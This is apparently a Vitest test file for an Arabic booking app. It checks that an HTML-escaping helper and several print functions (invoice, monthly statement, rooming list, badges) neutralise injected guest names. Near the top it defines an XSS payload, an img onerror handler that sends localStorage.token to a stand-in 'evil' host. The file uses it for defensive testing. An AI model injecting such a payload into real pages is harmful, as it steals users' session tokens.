import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { escapeHtml } from './printWindow';
import { printBookingInvoice, printMonthlyStatement } from './invoice';
import { printRoomingList, printBadges } from './roomingList';
import type { Booking, Attendee, RoomAllocation, Room } from '../types';

const PAYLOAD = '<img src=x onerror="fetch(\'//evil/\'+localStorage.token)">';

/**
 * Captures what the print helpers write into the popup, so the assertions run
 * against the real document these functions produce rather than a stub.
 */
function captureWrites() {
  const chunks: string[] = [];
  const fakeWindow = {
    document: {
      open: vi.fn(),
      write: (html: string) => { chunks.push(html); },
      close: vi.fn(),
    },
  };
  vi.spyOn(window, 'open').mockReturnValue(fakeWindow as unknown as Window);
  return () => chunks.join('');
}

beforeEach(() => {
  vi.spyOn(window, 'alert').mockImplementation(() => {});
});
afterEach(() => vi.restoreAllMocks());

describe('escapeHtml', () => {
  it('neutralises an HTML injection payload', () => {
    const out = escapeHtml(PAYLOAD);
    expect(out).not.toContain('<img');
    expect(out).not.toContain('onerror="');
    expect(out).toContain('&lt;img');
  });

  it('escapes every character that can break out of markup or an attribute', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('>')).toBe('&gt;');
    expect(escapeHtml('"')).toBe('&quot;');
    expect(escapeHtml("'")).toBe('&#39;');
  });

  // The whole app is Arabic — escaping must not mangle ordinary names.
  it('leaves ordinary Arabic text untouched', () => {
    const name = 'كنيسة السيدة العذراء والبابا كيرلس عمود الدين';
    expect(escapeHtml(name)).toBe(name);
    expect(escapeHtml('أندرو أشرف — غرفة ٣')).toBe('أندرو أشرف — غرفة ٣');
  });

  it('escapes & first so nothing is double-encoded', () => {
    expect(escapeHtml('<a & b>')).toBe('&lt;a &amp; b&gt;');
  });

  it('renders null and undefined as an empty string', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });
});

const booking = {
  id: 'booking_abc123', userName: 'ضيف', organizationName: '', houseName: 'بيت الخلوة',
  checkIn: '2026-07-15', checkOut: '2026-07-18', guestsCount: 10,
  totalPrice: 5000, depositAmount: 1000, depositPaid: true,
} as unknown as Booking;

describe('printed documents escape guest-supplied text', () => {
  // The guest types these; the OWNER prints them. The popup shares this app's
  // origin, so an unescaped name would run with access to the owner's session.
  it('invoice: escapes the guest/organisation name and the house name', () => {
    const read = captureWrites();
    printBookingInvoice({ ...booking, organizationName: PAYLOAD } as Booking, PAYLOAD);
    const html = read();

    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;img src=x');
  });

  it('monthly statement: escapes each booking row and the house name', () => {
    const read = captureWrites();
    printMonthlyStatement({
      houseName: PAYLOAD, monthLabel: PAYLOAD,
      revenue: 1, commission: 1, deposits: 1, remaining: 1, expenses: 1, net: 1,
      bookings: [{ guest: PAYLOAD, date: PAYLOAD, total: 1 }],
    });
    const html = read();

    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;img src=x');
  });

  it('rooming list: escapes attendee and room names', () => {
    const attendees = [{ id: 'a1', bookingId: booking.id, name: PAYLOAD, groupType: 'youth', gender: 'male' }] as unknown as Attendee[];
    const allocations = [{ bookingId: booking.id, attendeeId: 'a1', roomId: 'r1', bedNumber: 1 }] as unknown as RoomAllocation[];
    const rooms = [{ id: 'r1', name: PAYLOAD }] as unknown as Room[];

    const read = captureWrites();
    printRoomingList(booking, attendees, allocations, rooms);
    const html = read();

    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;img src=x');
  });

  it('badges: escapes the attendee name', () => {
    const attendees = [{ id: 'a1', bookingId: booking.id, name: PAYLOAD, groupType: 'youth', gender: 'male' }] as unknown as Attendee[];

    const read = captureWrites();
    printBadges(booking, attendees, [], []);
    const html = read();

    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;img src=x');
  });

  // Escaping must not cost readability: a real Arabic name still prints as-is.
  it('still renders a normal Arabic name unchanged', () => {
    const read = captureWrites();
    printBookingInvoice({ ...booking, organizationName: 'كنيسة مار جرجس' } as Booking, 'بيت طابا');
    const html = read();

    expect(html).toContain('كنيسة مار جرجس');
    expect(html).toContain('بيت طابا');
  });
});
